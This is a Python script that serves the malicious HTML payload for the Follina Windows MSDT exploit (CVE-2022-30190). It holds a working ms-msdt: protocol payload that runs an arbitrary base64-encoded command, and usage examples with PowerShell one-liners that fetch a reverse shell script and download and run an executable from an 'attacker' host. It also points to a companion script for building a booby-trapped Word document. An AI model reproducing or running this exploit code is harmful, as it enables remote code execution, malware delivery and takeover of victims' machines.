#!/usr/bin/env python3
"""
Title:     Follina Payload Server
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2022-30190
Advisory:  https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190

This script serves the malicious HTML payload for the Follina exploit.
"""

import argparse
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
import base64

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class PayloadHandler(BaseHTTPRequestHandler):
    """HTTP handler to serve the Follina payload"""
    
    command = "calc.exe"
    
    def log_message(self, format, *args):
        """Custom logging"""
        logger.info("%s - %s" % (self.client_address[0], format % args))
    
    def do_GET(self):
        """Handle GET requests"""
        logger.info(f"Received request from {self.client_address[0]} for {self.path}")
        
        # Generate the malicious HTML payload
        html_payload = self.generate_payload()
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Length', len(html_payload))
        self.end_headers()
        self.wfile.write(html_payload.encode())
        
        logger.info(f"âœ“ Payload delivered to {self.client_address[0]}")
    
    def generate_payload(self):
        """Generate the malicious HTML payload"""
        # Encode command in base64 to avoid issues with special characters
        command_b64 = base64.b64encode(self.command.encode()).decode()
        
        # HTML payload that triggers MSDT with the command
        payload = f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="0; url='ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{command_b64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\"'">
<title>Loading...</title>
</head>
<body>
<p>Loading...</p>
</body>
</html>"""
        
        return payload


def main():
    parser = argparse.ArgumentParser(
        description='Follina (CVE-2022-30190) Payload Server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic server with calc.exe
  python3 serve_payload.py --port 8080 --command "calc.exe"

  # Reverse shell payload
  python3 serve_payload.py --port 8080 --command "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

  # Download and execute payload
  python3 serve_payload.py --port 8080 --command "powershell -c wget http://attacker/payload.exe -O C:\\\\temp\\\\p.exe; C:\\\\temp\\\\p.exe"
        """
    )
    
    parser.add_argument('--port', type=int, default=8080, help='Server port (default: 8080)')
    parser.add_argument('--command', default='calc.exe', help='Command to execute (default: calc.exe)')
    parser.add_argument('--host', default='0.0.0.0', help='Server host (default: 0.0.0.0)')
    
    args = parser.parse_args()
    
    # Set the command for the handler
    PayloadHandler.command = args.command
    
    # Start the server
    server_address = (args.host, args.port)
    httpd = HTTPServer(server_address, PayloadHandler)
    
    logger.info(f"Payload server started on {args.host}:{args.port}")
    logger.info(f"Command to execute: {args.command}")
    logger.info(f"\nPayload URL: http://{args.host if args.host != '0.0.0.0' else '<YOUR_IP>'}:{args.port}/payload.html")
    logger.info("\nGenerate a malicious document with:")
    logger.info(f"  python3 generate_doc.py --url http://<YOUR_IP>:{args.port}/payload.html --output exploit.docx")
    logger.info("\nWaiting for connections...")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        logger.info("\nShutting down server...")
        httpd.shutdown()


if __name__ == '__main__':
    main()
